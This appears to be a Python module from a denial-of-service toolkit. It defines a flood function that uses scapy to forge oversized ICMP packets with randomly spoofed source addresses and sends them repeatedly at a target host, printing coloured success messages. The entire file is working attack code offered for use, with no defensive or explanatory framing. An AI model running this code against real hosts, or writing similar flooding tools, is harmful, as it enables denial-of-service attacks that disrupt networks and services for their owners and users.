import random
from bin.addons.utils import random_IP
from scapy.layers.inet import ICMP, IP
from scapy.sendrecv import send
from rich.console import Console

# Define styled print
print = Console().print
red = "red3"
green = "green1"
pink = "magenta3"
yellow = "yellow1"
blue = "dark_slate_gray2"
__junk = list("1234567890qwertyuiopasdfghjklzxcvbnm")


def flood(target):
    rand_addr = random_IP()
    ip_hdr = IP(src=rand_addr, dst=target[0])
    junk_size = random.randrange(50000, 65535)
    packet = ip_hdr / ICMP() / (random.choice(__junk) * junk_size)
    for i in range(4):
        try:
            send(packet, verbose=False)
        except Exception as e:
            print(
                f"[{red} bold][✘] ERROR[/{red} bold] "
                + f"[{yellow}]While sending packget[/{yellow}]\n{e}"
            )
        else:
            print(
                f"[{green}][✔] SUCCESS[/{green}] "
                + f"[{yellow}]Packget send! Payload size:[/{yellow}] "
                + f"[{blue}]{junk_size}"
            )
